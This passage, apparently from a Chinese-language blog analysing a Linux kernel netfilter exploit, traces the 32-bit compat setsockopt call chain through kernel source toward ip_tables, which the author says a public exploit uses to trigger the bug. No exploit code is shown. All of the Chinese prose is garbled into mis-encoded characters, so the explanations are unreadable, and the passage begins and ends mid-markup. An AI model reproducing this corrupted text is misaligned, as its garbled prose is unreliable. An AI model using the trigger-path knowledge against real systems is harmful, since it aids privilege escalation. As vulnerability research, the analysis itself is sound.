class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">.pf= PF_INET,</span><br><span class="line">.set_optmin= IPT_BASE_CTL,</span><br><span class="line">.set_optmax= IPT_SO_SET_MAX+<span class="number">1</span>,</span><br><span class="line">.<span class="built_in">set</span>= do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_set= compat_do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.get_optmin= IPT_BASE_CTL,</span><br><span class="line">.get_optmax= IPT_SO_GET_MAX+<span class="number">1</span>,</span><br><span class="line">.get= do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_get= compat_do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="32-ä½ä¸‹çš„-setsockopt-ç³»ç»Ÿè°ƒç”¨"><a href="#32-ä½ä¸‹çš„-setsockopt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="32 ä½ä¸‹çš„ setsockopt ç³»ç»Ÿè°ƒç”¨"></a>32 ä½ä¸‹çš„ setsockopt ç³»ç»Ÿè°ƒç”¨</h2><blockquote><p>æœ¬æ¬¡æ¼æ´åˆ©ç”¨ä¸­æˆ‘ä»¬åˆ›å»º socket æ—¶ä½¿ç”¨ <code>socket(AF_INTE, SOCK_STREAM, 0)</code>ï¼Œæ•…åé¢æ¶‰åŠåˆ°çš„ socket æºç éƒ½ä¼šé¡ºç€è¿™ä¸ªè·¯å¾„åˆ†æ</p></blockquote><p>åœ¨è®¾ç½®äº† <code>CONFIG_COMPAT=y</code> çš„æƒ…å†µä¸‹ï¼ˆæ„ä¸ºå…¼å®¹ 32 ä½ï¼Œé»˜è®¤å¼€å¯ï¼‰ï¼Œ32ä½ç¨‹åºè¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶<strong>å®é™…ä¸Šæ˜¯é€šè¿‡ COMPAT_SYSCALL_DEFINE å®å®šä¹‰çš„å…¼å®¹ 32 ä½ç³»ç»Ÿè°ƒç”¨å®Œæˆçš„</strong></p><blockquote><p>æˆ‘ä»¬çŸ¥é“ 32 ä½ç¨‹åºé€šè¿‡ 0x80 å·ä¸­æ–­è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè€Œ 64 ä½ç¨‹åºåˆ™é€šè¿‡ syscall æŒ‡ä»¤å®Œæˆç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤åœ¨64ä½å†…æ ¸ä¸­å°† 0x80 å·ä¸­æ–­ä¸“é—¨ç”¨ä½œå…¼å®¹ 32 ä½è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨å…¥å£</p></blockquote><p>å› æ­¤å½“ä¸€ä¸ª 32 ä½ç¨‹åºè¿›è¡Œ setsockopt ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>__compat_sys_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COMPAT_SYSCALL_DEFINE5(setsockopt, <span class="type">int</span>, fd, <span class="type">int</span>, level, <span class="type">int</span>, optname,</span><br><span class="line">       <span class="type">char</span> __user *, optval, <span class="type">unsigned</span> <span class="type">int</span>, optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __compat_sys_setsockopt(fd, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å…¶å® glibc ä¸­çš„ setsockopt çš„ wrapper æ˜¯é€šè¿‡ <code>socketcall</code> è¿™ä¸€ç³»ç»Ÿè°ƒç”¨è¿›è¡Œçš„ï¼Œå®é™…ä¸Šåœ¨å¾ˆä¹…ä»¥å‰è¯¥ç³»ç»Ÿè°ƒç”¨å…¶å®æ˜¯ socket ç›¸å…³ç³»ç»Ÿè°ƒç”¨çš„å”¯ä¸€å…¥å£ç‚¹ï¼Œåé¢å„ç§å­åŠŸèƒ½æ‹†åˆ†æˆäº†å¤šä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ˜¯è¯¥ç³»ç»Ÿè°ƒç”¨ä»ç„¶ä¿ç•™äº†ä¸‹æ¥ï¼Œå› æ­¤å¯¹äºåŒä¸€ä¸ªåŠŸèƒ½ï¼Œå³å¯ä»¥èµ° socketcall ç³»ç»Ÿè°ƒç”¨ï¼Œä¹Ÿå¯ä»¥èµ°æ‹†åˆ†å‡ºæ¥çš„é‚£ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åçš„è·¯å¾„æ˜¯ç›¸åŒçš„</p></blockquote><p>åœ¨å…¬å¼€çš„ exp ä¸­æ¼æ´è§¦å‘è·¯å¾„æŒ‡å®šäº† level ä¸º <code>SOL_IP</code>ï¼Œæ•…åœ¨ <code>__compat_sys_setsockopt()</code>ä¸­æœ€ç»ˆä¼šèµ°åˆ° <code>sock-&gt;ops-&gt;compat_setsockopt</code> æˆ– <code>sock-&gt;ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __compat_sys_setsockopt(<span class="type">int</span> fd, <span class="type">int</span> level, <span class="type">int</span> optname,</span><br><span class="line">   <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optlen &gt; INT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock = sockfd_lookup(fd, &amp;err);</span><br><span class="line"><span class="keyword">if</span> (sock) &#123;</span><br><span class="line">err = security_socket_setsockopt(sock, level, optname);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">sockfd_put(sock);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">err = compat_sock_setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sock-&gt;ops-&gt;compat_setsockopt)</span><br><span class="line">err = sock-&gt;ops-&gt;compat_setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">err = sock-&gt;ops-&gt;setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line">sockfd_put(sock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥èµ°å…¥å“ªæ¡è·¯å¾„ï¼Ÿé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬éœ€è¦å…ˆçœ‹åˆ›å»ºè¯¥å‡½æ•°è¡¨çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªå‡½æ•°è¡¨å…¶å®æ˜¯åœ¨ socket åˆ›å»ºæ—¶ï¼ˆ<code>__sock_create()</code>ï¼‰è¿›è¡ŒåŠ¨æ€æŒ‡å®šçš„ï¼Œé€šè¿‡å¯¹åº” family æŒ‡å®šçš„åˆ›å»ºå‡½æ•°è¿›è¡Œåˆ›å»ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sock_create(<span class="keyword">struct</span> net *net, <span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol,</span><br><span class="line"> <span class="keyword">struct</span> socket **res, <span class="type">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">pf = rcu_dereference(net_families[family]);</span><br><span class="line">err = -EAFNOSUPPORT;</span><br><span class="line"><span class="keyword">if</span> (!pf)</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment"> * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">err = pf-&gt;create(net, sock, protocol, kern);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´å¯¹äº <code>AF_INET</code> ï¼ˆ<code>PF_INET</code>ï¼‰è€Œè¨€ï¼Œåº”è¯¥ç”¨åˆ°çš„æ˜¯ <code>inet_create()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">.family = PF_INET,</span><br><span class="line">.create = inet_create,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>inet_init()</code> å‡½æ•°ä¸­ä½¿ç”¨ <code>sock_register</code> åœ¨ <code>net_families</code> æ•°ç»„ä¸­æ³¨å†Œäº†è¯¥ç»“æ„ä½“ï¼ˆ<code>__init</code> å®å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªæ¨¡å—åˆå§‹åŒ–å‡½æ•°ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">inet_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Tell SOCKET that we are alive...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>)sock_register(&amp;inet_family_ops);</span><br></pre></td></tr></table></figure><p>è€Œåœ¨ <code>inet_create()</code> ä¸­ï¼Œåˆ™æ˜¯éå† æ•°ç»„æ‰¾åˆ°å¯¹åº”ç±»å‹çš„å‡½æ•°è¡¨ç»™åˆ° socketï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">inet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params">       <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> *<span class="title">answer</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> *<span class="title">answer_prot</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> answer_flags;</span><br><span class="line"><span class="type">int</span> try_loading_module = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (protocol &lt; <span class="number">0</span> || protocol &gt;= IPPROTO_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock-&gt;state = SS_UNCONNECTED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look for the requested type/protocol pair. */</span></span><br><span class="line">lookup_protocol:</span><br><span class="line">err = -ESOCKTNOSUPPORT;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="built_in">list</span>) &#123;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Check the non-wild match. */</span></span><br><span class="line"><span class="keyword">if</span> (protocol == answer-&gt;protocol) &#123;</span><br><span class="line"><span class="keyword">if</span> (protocol != IPPROTO_IP)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Check for the two wild cases. */</span></span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == protocol) &#123;</span><br><span class="line">protocol = answer-&gt;protocol;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    sock-&gt;ops = answer-&gt;ops;</span><br><span class="line">    answer_prot = answer-&gt;prot;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä½¿ç”¨å†…æ ¸çš„ rcu éå†å® <code>list_for_each_entry_rcu</code> å¯¹ <code>inetsw</code> è¿›è¡Œéå†ï¼Œå®é™…ä¸Šè¯¥é“¾è¡¨é€šè¿‡ <code>inetsw_array</code> å»ºç«‹ï¼Œå¯¹äº <code>IPPROTO_IP</code> è€Œè¨€å…¶å‡½æ•°è¡¨åº”ä¸º <code>inet_stream_ops</code>ï¼ˆæˆ‘ä»¬åœ¨å»ºç«‹ socket æ—¶ protocol æŒ‡å®šä¸º 0ï¼Œå³ <code>IPPROTO_IP</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> <span class="title">inetsw_array</span>[] =</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">.type =       SOCK_STREAM,</span><br><span class="line">.protocol =   IPPROTO_TCP,</span><br><span class="line">.prot =       &amp;tcp_prot,</span><br><span class="line">.ops =        &amp;inet_stream_ops,</span><br><span class="line">.flags =      INET_PROTOSW_PERMANENT |</span><br><span class="line">      INET_PROTOSW_ICSK,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åœ¨è¿›è¡Œ setsockopt æ—¶å…¶å®å¯¹åº”åº”è¯¥è°ƒç”¨åˆ° <code>inet_stream_ops</code> ä¸­çš„å‡½æ•°ï¼Œè¿™é‡Œå› ä¸ºæˆ‘ä»¬å¼€å¯äº†ç¼–è¯‘é€‰é¡¹ <code>CONFIG_COMPAT</code>ï¼ˆé»˜è®¤å¼€å¯ï¼‰ï¼Œ<strong>æ‰€ä»¥ setsockopt ç³»ç»Ÿè°ƒç”¨æœ€ç»ˆåº”è¯¥ä¼šè°ƒç”¨åˆ°</strong><code>compat_sock_common_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">inet_stream_ops</span> =</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt = compat_sock_common_setsockopt,</span><br><span class="line">.compat_getsockopt = compat_sock_common_getsockopt,</span><br><span class="line">.compat_ioctl   = inet_compat_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.set_rcvlowat   = tcp_set_rcvlowat,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä»–åˆä¼šè°ƒç”¨åˆ° <code>sk-&gt;sk_prot-&gt;compat_setsockopt()</code>ï¼Œå…¶å®å°±æ˜¯ socket ç»“æ„ä½“é‡Œçš„ sock ç»“æ„ä½“é‡Œçš„ sock_common ç»“æ„ä½“çš„ <code>skc_prot</code> æˆå‘˜ï¼ˆ<code>proto</code> ç»“æ„ä½“ç±»å‹ï¼‰çš„ <code>compat_setsockopt</code> å‡½æ•°æŒ‡é’ˆï¼ˆ<del>ä½ å¥—ä½ ğŸ¦„å‘¢</del>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_sock_common_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk-&gt;sk_prot-&gt;compat_setsockopt != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;compat_setsockopt(sk, level, optname,</span><br><span class="line">      optval, optlen);</span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_sock_common_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>åˆç»•å›åˆ° <code>inet_create</code>ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯¹åº”åˆ° <code>tcp_prot</code> å‡½æ•°è¡¨ï¼Œå¯¹åº”è°ƒç”¨åˆ° <code>compat_tcp_setsockopt()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> <span class="title">tcp_prot</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;TCP&quot;</span>,</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt= compat_tcp_setsockopt,</span><br><span class="line">.compat_getsockopt= compat_tcp_getsockopt,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.diag_destroy= tcp_abort,</span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(tcp_prot);</span><br></pre></td></tr></table></figure><p>åœ¨å…¬å¼€çš„ exp ä¸­æ¼æ´è§¦å‘è·¯å¾„æŒ‡å®šäº† level ä¸º <code>SOL_IP</code>ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥ä¼šå¯¹åº”è°ƒç”¨åˆ° <code>inet_csk_compat_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_tcp_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (level != SOL_TCP)</span><br><span class="line"><span class="keyword">return</span> inet_csk_compat_setsockopt(sk, level, optname,</span><br><span class="line">  optval, optlen);</span><br><span class="line"><span class="keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_tcp_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>inet_csk_compat_setsockopt</code> ä¸­ä¼šè°ƒç”¨åˆ° <code>icsk-&gt;icsk_af_ops-&gt;compat_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">inet_csk_compat_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">       <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (icsk-&gt;icsk_af_ops-&gt;compat_setsockopt)</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;compat_setsockopt(sk, level, optname,</span><br><span class="line">    optval, optlen);</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,</span><br><span class="line">     optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(inet_csk_compat_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>inet_csk()</code> å±•å¼€å…¶å®å°±æ˜¯ä¸€ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬åˆè¦è½¬å›å»çœ‹ <strong>socket ä¸­ sock ç»“æ„ä½“çš„åˆå§‹åŒ–è¿‡ç¨‹</strong>ï¼Œåœ¨ <code>inet_create()</code>  ä¸­ä½¿ç”¨ <code>sock_alloc()</code> åˆ›å»º sock ç»“æ„ä½“ï¼Œæœ€åä¼šè°ƒç”¨åˆ° <code>tcp_v4_init_sock</code>ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°å…¶åˆå§‹åŒ–æ‰€ç”¨çš„å‡½æ•°è¡¨ä¸º <code>ipv4_specific</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">tcp_v4_init_sock</span><span class="params">(<span class="keyword">struct</span> sock *sk)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line">tcp_init_sock(sk);</span><br><span class="line"></span><br><span class="line">icsk-&gt;icsk_af_ops = &amp;ipv4_specific;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TCP_MD5SIG</span></span><br><span class="line">tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€ååº”è¯¥è°ƒç”¨åˆ° <code>compat_ip_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock_af_ops</span> <span class="title">ipv4_specific</span> =</span> &#123;</span><br><span class="line">.queue_xmit   = ip_queue_xmit,</span><br><span class="line">.send_check   = tcp_v4_send_check,</span><br><span class="line">.rebuild_header   = inet_sk_rebuild_header,</span><br><span class="line">.sk_rx_dst_set   = inet_sk_rx_dst_set,</span><br><span class="line">.conn_request   = tcp_v4_conn_request,</span><br><span class="line">.syn_recv_sock   = tcp_v4_syn_recv_sock,</span><br><span class="line">.net_header_len   = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iphdr),</span><br><span class="line">.setsockopt   = ip_setsockopt,</span><br><span class="line">.getsockopt   = ip_getsockopt,</span><br><span class="line">.addr2sockaddr   = inet_csk_addr2sockaddr,</span><br><span class="line">.sockaddr_len   = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> 